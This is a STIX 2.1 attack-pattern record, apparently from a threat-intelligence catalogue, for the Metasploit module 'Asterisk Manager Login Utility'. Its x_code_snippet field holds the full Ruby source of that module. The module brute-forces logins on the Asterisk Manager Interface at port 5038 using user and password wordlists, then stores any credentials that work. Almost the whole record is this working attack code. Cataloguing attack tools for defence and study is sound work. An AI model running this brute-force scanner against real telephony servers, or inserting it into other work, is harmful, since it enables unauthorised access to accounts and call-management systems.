{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bb26ebf7-e380-4aec-a3ac-57744b1617b2",
    "created": "2024-08-14T16:31:23.734957Z",
    "modified": "2024-08-14T16:31:23.734972Z",
    "name": "Asterisk Manager Login Utility",
    "description": " This module attempts to authenticate to an Asterisk Manager service. Please note that by default, Asterisk Call Management (port 5038) only listens locally, but this can be manually configured in file /etc/asterisk/manager.conf by the admin on the victim machine. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/voip/asterisk_login.rb",
            "external_id": "asterisk_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Asterisk Manager Login Utility',\n      'Description'    => %q{\n        This module attempts to authenticate to an Asterisk Manager service. Please note\n        that by default, Asterisk Call Management (port 5038) only listens locally, but\n        this can be manually configured in file /etc/asterisk/manager.conf by the admin\n        on the victim machine.\n      },\n      'Author'         =>\n        [\n          'dflah_ <dflah[at]alligatorteam.org>',\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://www.asterisk.org/astdocs/node201.html'], # Docs for AMI\n        ],\n      'License'     => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(5038),\n        OptString.new('USER_FILE',\n          [\n            false,\n            'The file that contains a list of probable users accounts.',\n            File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_users.txt')\n          ]),\n\n        OptString.new('PASS_FILE',\n          [\n            false,\n            'The file that contains a list of probable passwords.',\n            File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')\n          ])\n      ])\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: 'asterisk_manager',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(ip)\n    print_status(\"Initializing module...\")\n    begin\n      each_user_pass do |user, pass|\n        do_login(user, pass)\n      end\n    rescue ::Rex::ConnectionError\n    rescue ::Exception => e\n      vprint_error(\"#{rhost}:#{rport} #{e.to_s} #{e.backtrace}\")\n    end\n  end\n\n  def send_manager(command='')\n    begin\n      @result = ''\n      if (!@connected)\n        connect\n        @connected = true\n        select(nil,nil,nil,0.4)\n      end\n      sock.put(command)\n      @result = sock.get_once || ''\n    rescue ::Exception => err\n      print_error(\"Error: #{err.to_s}\")\n    end\n  end\n\n  def do_login(user='',pass='')\n    @connected = false\n    begin\n      send_manager(nil) # connect Only\n      if @result !~ /^Asterisk Call Manager(.*)/\n        print_error(\"Asterisk Manager does not appear to be running\")\n        return :abort\n      else\n        vprint_status(\"#{rhost}:#{rport} - Trying user:'#{user}' with password:'#{pass}'\")\n        cmd = \"Action: Login\\r\\nUsername: #{user}\\r\\nSecret: #{pass}\\r\\n\\r\\n\"\n        send_manager(cmd)\n        if /Response: Success/.match(@result)\n          print_good(\"User: \\\"#{user}\\\" using pass: \\\"#{pass}\\\" - can login on #{rhost}:#{rport}!\")\n          report_cred(ip: rhost, port: rport, user: user, password: pass, proof: @result)\n          disconnect\n          return :next_user\n        else\n          disconnect\n          return :fail\n        end\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n"
}